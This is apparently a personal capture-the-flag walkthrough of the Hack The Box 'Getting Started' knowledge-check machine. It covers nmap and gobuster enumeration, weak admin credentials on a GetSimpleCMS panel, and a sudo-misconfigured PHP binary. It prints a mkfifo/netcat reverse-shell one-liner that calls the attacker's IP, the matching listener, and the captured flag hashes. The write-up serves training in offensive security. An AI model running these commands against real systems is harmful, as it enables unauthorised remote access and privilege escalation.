############
Boxes Pwned
############



Getting Started - Knowledge check box
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

https://p.ip.fi/BrXY -- terminal logs that contain exploitation of the box using msfconsole (we get user level or non-root permissions here). 

https://p.ip.fi/5iip -- attack vm terminal logs that were used to listen to connections and get the compromised box to connect to us (to escalate privileges)


nmap scan
=========

.. code-block:: console

   ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge/nmap-scans]
   └─$ nmap -sV --open 10.129.230.124 -oA nmap_scan
   Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 00:35 EDT
   Nmap scan report for 10.129.230.124
   Host is up (0.019s latency).
   Not shown: 998 closed tcp ports (reset)
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds



nmap full scan
===================================

.. code-block:: console

   ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge/nmap-scans]
   └─$ nmap -sV --open -p- -oA nmap_full_scan 10.129.230.124 -O
   Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 00:36 EDT
   Nmap scan report for 10.129.230.124
   Host is up (0.017s latency).
   Not shown: 65533 closed tcp ports (reset)
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
   Device type: general purpose|router
   Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
   OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
   OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
   Network Distance: 2 hops
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds



Directory enumeration with gobuster
===================================

.. code-block:: console

   ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge]
   └─$ gobuster dir -u http://10.129.230.124 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://10.129.230.124
   [+] Method:                  GET
   [+] Threads:                 10
   [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /.hta                 (Status: 403) [Size: 279]
   /.htaccess            (Status: 403) [Size: 279]
   /.htpasswd            (Status: 403) [Size: 279]
   /admin                (Status: 301) [Size: 316] [--> http://10.129.230.124/admin/]
   /backups              (Status: 301) [Size: 318] [--> http://10.129.230.124/backups/]
   /data                 (Status: 301) [Size: 315] [--> http://10.129.230.124/data/]
   /index.php            (Status: 200) [Size: 5485]
   /plugins              (Status: 301) [Size: 318] [--> http://10.129.230.124/plugins/]
   /robots.txt           (Status: 200) [Size: 32]
   /server-status        (Status: 403) [Size: 279]
   /sitemap.xml          (Status: 200) [Size: 431]
   /theme                (Status: 301) [Size: 316] [--> http://10.129.230.124/theme/]
   Progress: 4750 / 4750 (100.00%)
   ===============================================================
   Finished
   ===============================================================

/admin works with weak credentials :  
**username:** admin  
**password:** root

Reference:  
https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=31745

.. image:: ../screenshots/boxes/getting-started-knowledge-check/admin-page.png



upgrade to better tty
===================================

.. code-block:: console

   python3 -c 'import pty; pty.spawn("/bin/bash")'



Not able to download LinEnum.sh script
===================================

initial approach : used wget to download the script from a python http server running on the attack VM, didn't work

.. code-block:: console

   www-data@gettingstarted:/home/mrb3n$ wget 10.10.15.44:8000/LinEnum.sh
   ...
   LinEnum.sh: Permission denied

another approach : even directly using wget to download the script from github doesnt work :

.. code-block:: console

   www-data@gettingstarted:/home/mrb3n$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
   ...
   wget: unable to resolve host address ‘raw.githubusercontent.com’

also tried LinPEAS script but no DNS resolution available.

*(Filler: We can attempt SSH reverse tunneling or hosting scripts via IP for offline transfer.)*



check which commands require the mrb3n to use sudo
===================================

.. code-block:: console

   www-data@gettingstarted:/home/mrb3n$ sudo -l
   User www-data may run the following commands on gettingstarted:
       (ALL : ALL) NOPASSWD: /usr/bin/php

Privilege escalation using PHP reverse shell:

.. code-block:: console

   sudo /usr/bin/php -r "system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.44 8443 >/tmp/f');"



obtaining the user.txt flag
===================================

.. code-block:: console

   ┌──(kali-user㉿kali-linux)-[~/htb-practice/knowledge]
   └─$ msfconsole
   ...
   7002d65b149b0a4d19132a66feed21d8



obtaining the root.txt flag
===================================

Target VM:

.. code-block:: console

   www-data@gettingstarted:/home/mrb3n$ sudo /usr/bin/php -r "system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.44 8443 >/tmp/f');"

Attack VM:

.. code-block:: console

   ┌──(kali-user㉿kali-linux)-[~/htb-practice/Nibbles]
   └─$ nc -nvlp 8443
   ...
   root@gettingstarted:~# cat root.txt
   f1fba6e9f71efb2630e6e34da6387842



We successfully obtained **user.txt** and **root.txt** by exploiting GetSimpleCMS RCE and using a `sudo misconfiguration` for privilege escalation.

